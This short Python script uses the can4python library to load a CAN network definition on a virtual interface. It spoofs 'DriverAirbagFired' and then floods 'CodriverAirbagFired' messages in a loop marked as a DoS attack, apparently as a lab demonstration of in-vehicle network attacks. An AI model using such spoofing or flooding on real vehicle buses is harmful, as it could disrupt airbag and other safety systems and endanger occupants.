import can4python
import can4python as can
import time

# Create a CAN Bus, the communication relationships in the CAN network are defined in the *.kcd file
# ego_node_ids defines a node or a list of nodes that will be enacted
bus = can.CanBus.from_kcd_file ('doc_example.kcd', 'vcan0', ego_node_ids=["1"])

# Send the specified signal
bus.send_signals({'DriverAirbagFired':1})

# DOS attack: send multiple signals
for i in range(1,1000):
    bus.send_signals ({'CodriverAirbagFired': 1})

#config = can4python.FilehandlerKcd.read("doc_example.kcd")
#print(config.get_descriptive_ascii_art())
#print(bus.get_descriptive_ascii_art())
